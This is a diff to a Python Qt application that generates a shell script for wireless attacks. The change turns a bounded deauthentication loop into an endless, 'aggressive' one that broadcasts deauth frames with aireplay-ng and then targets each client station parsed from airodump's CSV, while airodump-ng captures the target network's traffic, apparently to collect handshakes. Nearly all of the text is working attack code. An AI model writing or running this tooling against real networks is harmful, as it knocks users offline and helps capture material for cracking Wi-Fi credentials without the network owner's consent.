@@ -1158,16 +1158,34 @@ class MaximWindow(QMainWindow):
         script.write("echo '══════════════════════════════════════════════════════════'\n")
         script.write("echo\n\n")
 
-        # Background: deauth loop (targeted at BSSID, only affects clients on target network)
-        script.write("echo '[2/3] Deauthing clients on target network...'\n")
-        script.write("(\n  sleep 3\n  for j in $(seq 1 30); do\n")
-        script.write(f"    sudo aireplay-ng --deauth 5 -a $BSSID {iface} >/dev/null 2>&1\n")
-        script.write("    sleep 5\n  done\n) &\n\n")
+        # Background: aggressive deauth — broadcast first, then target each station individually
+        script.write("echo '[2/3] Deauthing clients...'\n")
+        script.write("(\n")
+        script.write("  sleep 5\n")  # let airodump collect stations first
+        script.write("  while true; do\n")
+        # Broadcast deauth (hits all clients)
+        script.write(f"    sudo aireplay-ng --deauth 10 -a $BSSID {iface} >/dev/null 2>&1\n")
+        script.write("    sleep 2\n")
+        # Also deauth each individual station from the airodump CSV for stronger effect
+        script.write(f"    CAP_CSV=$(ls -t '{capture_prefix}'-*.csv 2>/dev/null | head -1)\n")
+        script.write("    if [ -n \"$CAP_CSV\" ]; then\n")
+        # Station lines in the CSV contain BSSID in the associated-to field
+        script.write("      grep -i \"$BSSID\" \"$CAP_CSV\" | grep -Ev \"^$BSSID\" | grep -E '^[0-9A-Fa-f]{2}:' | while IFS=, read -r STA REST; do\n")
+        script.write("        STA=$(echo \"$STA\" | tr -d ' ')\n")
+        script.write("        if [ -n \"$STA\" ]; then\n")
+        script.write(f"          sudo aireplay-ng --deauth 10 -a $BSSID -c $STA {iface} >/dev/null 2>&1\n")
+        script.write("        fi\n")
+        script.write("      done\n")
+        script.write("    fi\n")
+        script.write("    sleep 8\n")
+        script.write("  done\n")
+        script.write(") &\n")
+        script.write("DEAUTH_PID=$!\n\n")
 
         # Foreground: capture
         script.write(f"echo '[3/3] Capturing...'\n")
-        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' {iface}\n\n")
-
+        script.write(f"sudo airodump-ng -c $CHANNEL --bssid $BSSID -w '{capture_prefix}' --output-format pcap,csv {iface}\n\n")
+        script.write("kill $DEAUTH_PID 2>/dev/null\n")
         script.write(f"echo 'DONE' > '{signal_file}'\n")
         script.write("echo 'Capture stopped.'\nread -p 'Press Enter to close'\n")
 
